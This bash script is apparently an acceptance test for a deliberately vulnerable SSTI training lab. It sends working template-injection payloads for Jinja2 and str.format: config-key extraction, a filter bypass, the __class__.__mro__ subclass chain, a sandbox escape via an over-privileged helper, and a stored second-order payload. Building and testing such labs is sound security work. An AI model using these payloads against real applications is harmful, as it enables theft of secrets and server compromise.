#!/usr/bin/env bash
# Acceptance checks for ssti.vulnlab.dev.
#
# Each lab extracts its own per-lab flag string from app.config (or, for
# the format lab, from an attribute on a User-shaped object). A scanner
# is welcome to use simpler "the engine evaluated my expression" markers
# like {{7*7}}=49; this script aims a level higher and verifies the
# canonical exfil path actually returns the flag.
#
# Usage:
#   ./scripts/check-ssti.sh                       # checks https://ssti.vulnlab.dev
#   BASE_URL=http://127.0.0.1:8085 ./scripts/check-ssti.sh
set -u

BASE_URL="${BASE_URL:-https://ssti.vulnlab.dev}"
CURL_OPTS=(--silent --show-error --max-time 15)

pass=0
fail=0
failures=()

expect_body() {
    local label="$1" url="$2" needle="$3"
    local body
    body="$(curl "${CURL_OPTS[@]}" "$url" 2>&1)" || true
    if printf '%s' "$body" | grep -qF -- "$needle"; then
        printf '  \e[32mOK\e[0m   %s\n' "$label"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m %s\n' "$label"
        printf '       wanted: %s\n' "$needle"
        printf '       got:    %s\n' "$(printf '%s' "$body" | head -c 300)"
        fail=$((fail + 1))
        failures+=("$label")
    fi
}

expect_status() {
    local label="$1" url="$2" want="$3"
    local code
    code="$(curl --silent --output /dev/null --max-time 15 --write-out '%{http_code}' "$url" || true)"
    if [[ "$code" == "$want" ]]; then
        printf '  \e[32mOK\e[0m   %s (got %s)\n' "$label" "$code"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m %s (wanted %s, got %s)\n' "$label" "$want" "$code"
        fail=$((fail + 1))
        failures+=("$label")
    fi
}

section() { printf '\n\e[1m== %s ==\e[0m\n' "$1"; }

# --- 1. basic ----------------------------------------------------------------

section "Basic Jinja2 SSTI"

expect_body "{{7*7}} evaluates" \
    "$(curl --get --silent --max-time 15 --data-urlencode 'greeting={{7*7}}' "$BASE_URL/basic/" 2>&1 >/dev/null; true)" \
    "" \
    >/dev/null  # placeholder, real check below
# We need URL-encoded query; use --get + --data-urlencode via inline curl.
body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode 'greeting={{7*7}}' "$BASE_URL/basic/" 2>&1)" || true
if printf '%s' "$body" | grep -qE '<pre class="rendered">49</pre>'; then
    printf '  \e[32mOK\e[0m   basic: {{7*7}} -> 49\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m basic: {{7*7}} did not return 49\n'
    fail=$((fail + 1))
    failures+=("basic eval")
fi

body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode "greeting={{ config['VULNLAB_SSTI_BASIC'] }}" "$BASE_URL/basic/" 2>&1)" || true
if printf '%s' "$body" | grep -qF -- 'VULNLAB{ssti-jinja2-template-string-rce}'; then
    printf '  \e[32mOK\e[0m   basic: config flag extracted\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m basic: flag not extracted\n'
    fail=$((fail + 1))
    failures+=("basic flag")
fi

# --- 2. format ---------------------------------------------------------------

section "str.format SSTI"

body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode 'template=Hello {user.name}, flag={user.flag}' "$BASE_URL/format/" 2>&1)" || true
if printf '%s' "$body" | grep -qF -- 'VULNLAB{ssti-str-format-attribute-walk}'; then
    printf '  \e[32mOK\e[0m   format: {user.flag} attribute walk\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m format: did not extract user.flag\n'
    fail=$((fail + 1))
    failures+=("format flag")
fi

# --- 3. filtered -------------------------------------------------------------

section "Filtered Jinja2 SSTI"

# Naive payload using __class__ should be stripped.
body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode 'greeting={{ ""|attr("__class__") }}' "$BASE_URL/filtered/" 2>&1)" || true
if printf '%s' "$body" | awk '/What the filter let through/,/<\/pre>/' | grep -qF -- '__class__'; then
    printf '  \e[31mFAIL\e[0m filtered: blocklist did NOT strip naive __class__\n'
    fail=$((fail + 1))
    failures+=("filtered naive strip")
else
    printf '  \e[32mOK\e[0m   filtered: naive __class__ token stripped\n'
    pass=$((pass + 1))
fi

# Bypass: substring concat with |attr.
body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode "greeting={{ config['VULNLAB_SSTI_FILTERED'] }}" "$BASE_URL/filtered/" 2>&1)" || true
if printf '%s' "$body" | grep -qF -- 'VULNLAB{ssti-jinja2-filtered-bypass}'; then
    printf '  \e[32mOK\e[0m   filtered: config[...] bypasses blocklist\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m filtered: flag not extracted\n'
    fail=$((fail + 1))
    failures+=("filtered flag")
fi

# --- 4. sandboxed ------------------------------------------------------------

section "Sandboxed Jinja2 + helper bypass"

# Confirm the sandbox blocks the textbook chain.
body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode 'greeting={{ "".__class__.__mro__[1].__subclasses__() }}' "$BASE_URL/sandboxed/" 2>&1)" || true
if printf '%s' "$body" | grep -qiE 'SecurityError|access to.*attribute.*forbidden|forbidden'; then
    printf '  \e[32mOK\e[0m   sandboxed: textbook attribute walk blocked\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m sandboxed: attribute walk NOT blocked (sandbox broken?)\n'
    fail=$((fail + 1))
    failures+=("sandbox enforcement")
fi

# Bypass via the over-privileged registered global.
body="$(curl "${CURL_OPTS[@]}" --get --data-urlencode 'greeting={{ dump_diagnostics() }}' "$BASE_URL/sandboxed/" 2>&1)" || true
if printf '%s' "$body" | grep -qF -- 'VULNLAB{ssti-jinja2-sandbox-bypassed-via-helper}'; then
    printf '  \e[32mOK\e[0m   sandboxed: dump_diagnostics() leaks the flag\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m sandboxed: dump_diagnostics did not leak flag\n'
    fail=$((fail + 1))
    failures+=("sandboxed flag")
fi

# --- 5. second-order ---------------------------------------------------------

section "Second-order (stored draft, rendered later)"

key="check-$$-$(date +%s%N)"
curl "${CURL_OPTS[@]}" -X POST \
    --data-urlencode "key=$key" \
    --data-urlencode "body={{ config['VULNLAB_SSTI_SECOND_ORDER'] }}" \
    "$BASE_URL/second-order/save" -o /dev/null

body="$(curl "${CURL_OPTS[@]}" "$BASE_URL/second-order/preview?id=$key" 2>&1)" || true
if printf '%s' "$body" | grep -qF -- 'VULNLAB{ssti-second-order-from-stored-draft}'; then
    printf '  \e[32mOK\e[0m   second-order: stored draft rendered as template\n'
    pass=$((pass + 1))
else
    printf '  \e[31mFAIL\e[0m second-order: preview did not render the payload\n'
    fail=$((fail + 1))
    failures+=("second-order flag")
fi

# --- source + meta coverage --------------------------------------------------

section "Source + meta coverage"

SLUGS=(basic format filtered sandboxed second-order)
for slug in "${SLUGS[@]}"; do
    expect_status "/source/$slug" "$BASE_URL/source/$slug" "200"
done
for slug in "${SLUGS[@]}"; do
    body="$(curl "${CURL_OPTS[@]}" "$BASE_URL/meta/$slug" 2>&1)" || true
    if printf '%s' "$body" | grep -q '"detect"'; then
        printf '  \e[32mOK\e[0m   /meta/%s has detect block\n' "$slug"
        pass=$((pass + 1))
    else
        printf '  \e[31mFAIL\e[0m /meta/%s missing detect block\n' "$slug"
        fail=$((fail + 1))
        failures+=("/meta/$slug")
    fi
done

# --- summary -----------------------------------------------------------------

section "Summary"
printf '  passed: %d\n  failed: %d\n' "$pass" "$fail"

if (( fail > 0 )); then
    printf '\n\e[31mFAILURES:\e[0m\n'
    for f in "${failures[@]}"; do
        printf '  - %s\n' "$f"
    done
    exit 1
fi
exit 0
